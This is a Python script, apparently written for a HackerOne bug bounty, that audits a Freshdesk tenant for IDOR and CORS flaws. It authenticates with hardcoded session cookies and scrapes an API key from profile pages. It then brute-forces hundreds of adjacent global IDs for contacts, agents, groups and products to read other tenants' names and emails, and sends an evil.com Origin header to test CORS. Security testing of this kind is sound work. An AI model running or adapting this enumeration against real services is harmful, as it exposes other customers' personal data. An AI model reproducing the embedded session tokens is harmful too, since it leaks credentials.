#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
auditor_freshdesk.py — Auditoría IDOR para Freshdesk
======================================================
Usa las cookies de sesión del browser para autenticarse y testea:
  1. Extracción de API Key desde el perfil
  2. IDOR en tickets (IDs 1..50)
  3. IDOR en contactos y agentes
  4. Endpoints de la API v2

Uso: python3 auditor_freshdesk.py
"""

import requests
import json
import re
import sys

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURACIÓN — Actualizar con las cookies actuales
# ─────────────────────────────────────────────────────────────────────────────
TARGET      = "https://wearehackerone5431.freshdesk.com"
API_KEY     = None  # Se intenta extraer automáticamente del perfil

HELPKIT_SESSION   = "cFJkQUpsVFZITHA3Y3VkTXl4TzdoZWo5WWphV2MreDQ2NEZFa2ZYd1A1eHFJUnhHR1JwV2o2eUgxZkRLVVZ4dGhuOEptU3FSdFMvWjFHMENhalpnNldCS1RyTkI5VEVNckNMVHJGbnRaZkxpcGhVUFh4bTMyQmdBZkRuQTN1Yy9XR0VZSlFPVTIyMWQ5TTE1aXVGNEhRQ1FXSFR4UTdFU3ZKS0FGcm83UmR2cFF5aWM2SjdTUHlURG9peDZoR3NMbmlSUCsyWG1IQkJtcHlYTWRCTlphdVBVeUllYWMvRUMxcWxEQW0vZjJpRmRuUjZ4UTVPMVg4Z24yNW10ZDQvUTltVmNvQXV6VXF4bFpESDl1UG0yanhGdXgyNEVCU0p5N1VhcDJJWnB1Q2w4SVg0dUZ4TTBYL3JaNWdtYjU5TlJtT2Jtc2Q1Z3NweGsxbUJweUpjWnN6UjZuUGE4cEtkdHA3Nmk4V051ekFTUDNDV2FMWGQzbGp2VUFScWJHL0QzMEFwVXdEWGtFVFVvWmVKZVJrN3EySW9sSnIzeUlIM3I3ZEFwaCt5MTJLWEhIUEdSZzY4UWIrcDF2NWFPWUJXZGJSR1BpVEc2T2lSQ21yb3hOTjRWdHEyR1Z5azZ6WnJQNkRjMkdLODQwem16eVEwUHJySmxDSC9abDl5WktUeFhvM0Y1aHdXMjhVTEVHVm5DbWxqY1pCcFlmZ01zNU9PdWU2OW1DNE43ZDU3THM4OVNpQ3hmZ3F3RjRCTWRDRUlza0o5eEJ6Nzk1SlhSa2dkdU5YMHVYOXhPaG1tT21USzRzbFFSbHlRbHQ0b0xuM3lUZ2FXQUlVeXpoeHNLbWRxVGlWRk9hNEdIMjl2OCtpZHJ1S1VtR2xuWWUzQ2ZNR0xMTWtacWFkek1KbXM9LS16UmQ0Y3dBcWlLTlFidmhXK1RzRHV3PT0%3D--62967d2d60b9113b62cf51c3388351dadf982a9e"
USER_CREDS        = "BAhJIgGOZTE4YjYzZjIzMWI0YzBjNzU0ZDk3YWFkMTFlNTUyNjM0YWM0NDljNjVlMWYxNWYxMjYwNTljYzU4YWZiYmE3ZGVmNDYyYzMwMjU2ZGI5OGNlNDhkNzZlOGM4NmVhMGIxMTA1MGZhNDA3OGY0NTc5MDU2MDE0NGZjMzJhNjMwYmI6OjE1ODAxNDk4ODQwMgY6BkVU--4dcdc63ebb176b9449284a9d4dbfbaa8d7e1db1a"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-Bug-Bounty": "HackerOne-tomas244",
    "Accept": "application/json, text/plain, */*",
    "Referer": TARGET,
}

COOKIES = {
    "_helpkit_session": HELPKIT_SESSION,
    "user_credentials": USER_CREDS,
}

# ─────────────────────────────────────────────────────────────────────────────
sess = requests.Session()
sess.headers.update(HEADERS)
sess.cookies.update(COOKIES)
sess.verify = True


def sep(titulo=""):
    print(f"\n{'─'*60}")
    if titulo:
        print(f"  {titulo}")
        print(f"{'─'*60}")


def check_auth():
    """Verifica que las cookies son válidas haciendo un request simple."""
    sep("1. VERIFICANDO AUTENTICACIÓN")
    r = sess.get(f"{TARGET}/a/tickets", allow_redirects=False)
    print(f"  GET /a/tickets → {r.status_code}")
    if r.status_code in [200, 302]:
        print("  ✅ Cookies válidas — sesión activa")
        return True
    else:
        print("  ❌ Sesión expirada o inválida. Renovar cookies.")
        return False


def extraer_api_key():
    """Intenta extraer la API key desde la página de perfil."""
    sep("2. EXTRAYENDO API KEY DEL PERFIL")
    for url_path in ["/a/profile", "/profile", "/helpdesk/profile"]:
        r = sess.get(f"{TARGET}{url_path}", allow_redirects=True)
        print(f"  GET {url_path} → {r.status_code}")
        if r.status_code == 200:
            # Buscar API key en el HTML (suele estar en un campo de texto o data attribute)
            patrones = [
                r'"api_key"\s*:\s*"([a-zA-Z0-9]+)"',
                r'api[_-]key["\s>:]+([a-zA-Z0-9]{20,})',
                r'data-api-key="([a-zA-Z0-9]+)"',
                r'"authToken"\s*:\s*"([a-zA-Z0-9]+)"',
            ]
            for patron in patrones:
                match = re.search(patron, r.text, re.IGNORECASE)
                if match:
                    key = match.group(1)
                    print(f"  ✅ API Key encontrada: {key}")
                    return key
            print(f"  ⚠️  Página cargó pero API key no encontrada en HTML")
    print("  ℹ️  No se pudo extraer API key — usando solo sesión")
    return None


def test_api_v2_con_sesion():
    """Testea endpoints de la API v2 usando la cookie de sesión."""
    sep("3. ENDPOINTS API v2 (con sesión)")
    endpoints = [
        "/api/v2/tickets",
        "/api/v2/contacts",
        "/api/v2/agents",
        "/api/v2/groups",
        "/api/v2/products",
        "/api/v2/roles",
        "/api/v2/settings/helpdesk",
    ]
    resultados = []
    for ep in endpoints:
        try:
            r = sess.get(f"{TARGET}{ep}", allow_redirects=False)
            status = r.status_code
            info = ""
            if status == 200:
                try:
                    data = r.json()
                    if isinstance(data, list):
                        info = f"✅  {len(data)} items — "
                        # Extraer IDs si existen
                        ids = [str(item.get("id","?")) for item in data[:5] if isinstance(item, dict)]
                        if ids:
                            info += f"IDs: {', '.join(ids)}"
                    elif isinstance(data, dict):
                        info = f"✅  dict con claves: {list(data.keys())[:5]}"
                except Exception:
                    info = f"✅  {len(r.text)} bytes (no-JSON)"
            elif status == 401:
                info = "🔒 Auth requerida — API key necesaria"
            elif status == 403:
                info = "🚫 Prohibido"
            elif status == 404:
                info = "❌ No encontrado"
            print(f"  {ep:40s} {status}  {info}")
            resultados.append({"endpoint": ep, "status": status, "info": info})
        except Exception as e:
            print(f"  {ep:40s} ERROR: {e}")
    return resultados


def test_idor_tickets():
    """Testea acceso a tickets por ID usando la sesión activa."""
    sep("4. IDOR EN TICKETS (IDs 1..20) — via sesión")
    # Usamos la sesión (cookies) que ya sabemos que funciona
    encontrados = []
    for ticket_id in range(1, 21):
        try:
            r = sess.get(f"{TARGET}/api/v2/tickets/{ticket_id}")
            if r.status_code == 200:
                data = r.json()
                subject = data.get("subject", "?")
                requester_id = data.get("requester_id", "?")
                print(f"  ✅ Ticket #{ticket_id}: '{subject[:50]}' — requester_id={requester_id}")
                encontrados.append(ticket_id)
            elif r.status_code == 404:
                print(f"  ⬜ Ticket #{ticket_id}: No existe (404)")
            elif r.status_code == 403:
                print(f"  🚨 Ticket #{ticket_id}: 403 Forbidden — POSIBLE IDOR BLOQUEADO")
            else:
                print(f"  ⚠️  Ticket #{ticket_id}: HTTP {r.status_code}")
        except Exception as e:
            print(f"  Ticket #{ticket_id}: ERROR {e}")
    return encontrados


def test_idor_contactos_vecinos(api_key=None):
    """
    Testea IDOR cross-tenant en contactos usando las cookies de sesión.
    Los IDs de contactos son GLOBALES (no por tenant).
    Si podemos acceder a IDs que no son nuestros → IDOR real.

    CRÍTICO: Usamos 'sess' (con cookies) porque la API Key extraída del HTML
    da 401. La sesión ya demostró funcionar en la Sección 3.
    """
    sep("5. IDOR CROSS-TENANT EN CONTACTOS (IDs vecinos) — via SESIÓN")
    print("  Nuestros IDs propios: 158015122423 – 158015122430")
    print("  Agente propio ID:     158015122564 (requester_id de ticket #3)")
    print("  Buscando IDs de OTROS tenants en un rango amplio...\n")

    # Nuestros IDs conocidos (contactos + agente)
    NUESTROS = set(range(158015122423, 158015122431)) | {158015122564}

    # Buscamos 100 IDs ANTES y 100 DESPUÉS de nuestro rango
    # (los vecinos más cercanos son los de tenants creados al mismo tiempo)
    rango_antes = range(158015122323, 158015122423)   # 100 antes
    rango_despues = range(158015122431, 158015122631)  # 200 después

    hallazgos = []
    total_200 = 0
    total_404 = 0
    total_401 = 0

    for rango, etiqueta in [(rango_antes, "ANTES"), (rango_despues, "DESPUES")]:
        print(f"  --- Rango {etiqueta} ---")
        for cid in rango:
            try:
                # Usamos sess (cookies) — NO api_key que da 401
                r = sess.get(f"{TARGET}/api/v2/contacts/{cid}")
                es_nuestro = "(nuestro)" if cid in NUESTROS else "AJENO"
                if r.status_code == 200:
                    total_200 += 1
                    data = r.json()
                    nombre = data.get("name", "?")
                    email = data.get("email", "?")
                    marker = "🚨 IDOR CROSS-TENANT" if cid not in NUESTROS else "✅ propio"
                    print(f"  [{cid}] {marker}: {nombre} / {email}")
                    if cid not in NUESTROS:
                        hallazgos.append({"id": cid, "nombre": nombre, "email": email})
                elif r.status_code == 404:
                    total_404 += 1
                    # Solo mostramos los 404 de nuestros IDs para no saturar
                    if cid in NUESTROS:
                        print(f"  [{cid}] ⬜ 404 (nuestro pero no existe?)")
                elif r.status_code == 401:
                    total_401 += 1
                    if cid in NUESTROS:
                        print(f"  [{cid}] 🔒 401 — sesión inválida (urgente: renovar cookies)")
                        break
                elif r.status_code == 403:
                    print(f"  [{cid}] 🔒 403 — Acceso denegado ({es_nuestro})")
                else:
                    print(f"  [{cid}] HTTP {r.status_code} ({es_nuestro})")
            except Exception as e:
                print(f"  [{cid}] ERROR: {e}")

    print(f"\n  Resumen: 200={total_200} | 404={total_404} | 401={total_401}")
    if hallazgos:
        print(f"\n  🚨🚨 IDOR CONFIRMADO: {len(hallazgos)} contactos ajenos accesibles!")
        for h in hallazgos:
            print(f"      → ID {h['id']}: {h['nombre']} / {h['email']}")
    elif total_401 > 0 and total_200 == 0:
        print("  ⚠️  Todo 401 — Las cookies de sesión expiaron. Renovar y volver a correr.")
    else:
        print("  ✅ No se accedió a contactos de otros tenants en este rango")
    return hallazgos


import time


def test_idor_recursos_globales():
    """
    Testea IDOR en recursos con IDs GLOBALES que NO son contactos:
    - Agentes (nuestro ID: 158014988402)
    - Grupos  (nuestro ID: 158000828355)
    - Productos (nuestro ID: 158000268689)
    - Roles   (nuestros IDs: 158002454197–158002454201)

    Si /api/v2/agents/{id_ajeno} devuelve 200 → IDOR en agentes.
    """
    sep("7. IDOR EN RECURSOS GLOBALES (Agentes / Grupos / Productos)")
    DELAY = 0.15  # segundos entre requests — evita 429

    recursos = [
        {
            "nombre": "AGENTES",
            "endpoint": "/api/v2/agents/{}",
            "nuestro_id": 158014988402,
            "rango": range(158014988302, 158014988502),  # ±100
        },
        {
            "nombre": "GRUPOS",
            "endpoint": "/api/v2/groups/{}",
            "nuestro_id": 158000828355,
            "rango": range(158000828255, 158000828455),  # ±100
        },
        {
            "nombre": "PRODUCTOS",
            "endpoint": "/api/v2/products/{}",
            "nuestro_id": 158000268689,
            "rango": range(158000268589, 158000268789),  # ±100
        },
    ]

    hallazgos_total = []

    for rec in recursos:
        print(f"\n  === {rec['nombre']} (nuestro ID: {rec['nuestro_id']}) ===")
        hallazgos = []
        resumen = {"200": 0, "403": 0, "404": 0, "429": 0, "otro": 0}

        for rid in rec["rango"]:
            time.sleep(DELAY)
            try:
                r = sess.get(f"{TARGET}{rec['endpoint'].format(rid)}")
                es_nuestro = rid == rec["nuestro_id"]
                if r.status_code == 200:
                    resumen["200"] += 1
                    data = r.json()
                    # Extraer campos según tipo de recurso
                    nombre = data.get("name", data.get("first_name", "?"))
                    email = data.get("email", "—")
                    marker = "✅ PROPIO" if es_nuestro else "🚨 IDOR CROSS-TENANT"
                    print(f"  [{rid}] {marker}: {nombre} / {email}")
                    if not es_nuestro:
                        hallazgos.append({"id": rid, "data": data})
                elif r.status_code == 403:
                    resumen["403"] += 1
                    # 403 también es interesante: el recurso EXISTE pero está bloqueado
                    marker = "🔒 PROPIO" if es_nuestro else "⚠️  EXISTE-AJENO"
                    if not es_nuestro:
                        print(f"  [{rid}] {marker} (403 — existe pero sin acceso)")
                elif r.status_code == 429:
                    resumen["429"] += 1
                    print(f"  [{rid}] ⏳ Rate limited (429) — pausando 5s...")
                    time.sleep(5)
                elif r.status_code == 404:
                    resumen["404"] += 1
                else:
                    resumen["otro"] += 1
                    print(f"  [{rid}] HTTP {r.status_code}")
            except Exception as e:
                print(f"  [{rid}] ERROR: {e}")

        print(f"  Resumen {rec['nombre']}: {resumen}")
        if hallazgos:
            print(f"  🚨 {len(hallazgos)} {rec['nombre']} AJENOS ACCESIBLES!")
            hallazgos_total.extend(hallazgos)
        else:
            print(f"  ✅ Sin IDOR en {rec['nombre']}")

    return hallazgos_total


def test_idor_conversaciones():
    """
    Las conversaciones (replies) dentro de tickets tienen IDs GLOBALES.
    GET /api/v2/tickets/{ticket_id}/conversations → devuelve lista con IDs
    Luego intentamos acceder a esos IDs desde otro contexto.
    """
    sep("8. IDOR EN CONVERSACIONES DE TICKETS")
    hallazgos = []

    for tid in [1, 2, 3]:
        r = sess.get(f"{TARGET}/api/v2/tickets/{tid}/conversations")
        if r.status_code == 200:
            convs = r.json()
            print(f"  Ticket #{tid}: {len(convs)} conversaciones")
            for conv in convs:
                cid = conv.get("id")
                body = conv.get("body_text", "")[:60]
                print(f"    → Conv ID: {cid} | body: '{body}'")
                hallazgos.append({"ticket": tid, "conv_id": cid})
        else:
            print(f"  Ticket #{tid}: HTTP {r.status_code}")

    if hallazgos:
        print(f"\n  Tenemos {len(hallazgos)} IDs de conversaciones globales.")
        print("  Próximo paso: intentar acceder a estas IDs desde otro tenant.")

    return hallazgos


def test_cors():
    """
    Testea CORS en endpoints con sesión (browser-facing).
    Vulnerabilidad real = ACAO refleja origin + ACAC: true
    """
    sep("6. TEST CORS — Browser endpoints + API")
    origenes = ["https://evil.com", "https://attacker.freshdesk.com", "null"]
    endpoints_sesion = [
        "/api/v2/tickets",
        "/api/v2/contacts",
        "/api/v2/agents",
        "/api/v2/settings/helpdesk",
    ]
    print("  Leyenda: ACAO=Access-Control-Allow-Origin | ACAC=Allow-Credentials")
    print("  🚨 VULNERABLE = ACAO refleja origin O es * CON ACAC:true\n")

    for ep in endpoints_sesion:
        for origen in origenes[:1]:
            r = sess.get(f"{TARGET}{ep}", headers={"Origin": origen})
            acao = r.headers.get("Access-Control-Allow-Origin", "—")
            acac = r.headers.get("Access-Control-Allow-Credentials", "—")
            refleja = (acao == origen)
            wildcard_con_creds = (acao == "*" and acac == "true")
            vulnerable = refleja or wildcard_con_creds
            marker = "🚨 VULNERABLE" if vulnerable else ("⚠️  wildcard (sin ACAC)" if acao == "*" else "✅ OK")
            print(f"  {ep:40s} ACAO={acao:20s} ACAC={acac:6s} {marker}")


def main():
    print("=" * 60)
    print("  AUDITOR FRESHDESK — IDOR & CORS Tester v2")
    print(f"  Target: {TARGET}")
    print("=" * 60)

    # 1. Verificar auth
    if not check_auth():
        print("\n❌ Sesión inválida. Renovar cookies en el script.")
        sys.exit(1)

    # 2. Extraer API key (intento)
    api_key = extraer_api_key()

    # 3. Endpoints API v2
    test_api_v2_con_sesion()

    # 4. IDOR en tickets
    test_idor_tickets()

    # 5. IDOR en contactos (ya sabemos: protegido por tenant)
    test_idor_contactos_vecinos(api_key)

    # 6. CORS
    test_cors()

    # 7. IDOR en agentes/grupos/productos (IDs globales — NUEVO)
    test_idor_recursos_globales()

    # 8. IDs de conversaciones (globales — NUEVO)
    test_idor_conversaciones()

    sep("RESUMEN FINAL")
    print("  Revisá los 🚨 arriba — cualquier 200 en recurso AJENO es reportable.")
    print("=" * 60)


if __name__ == "__main__":
    main()
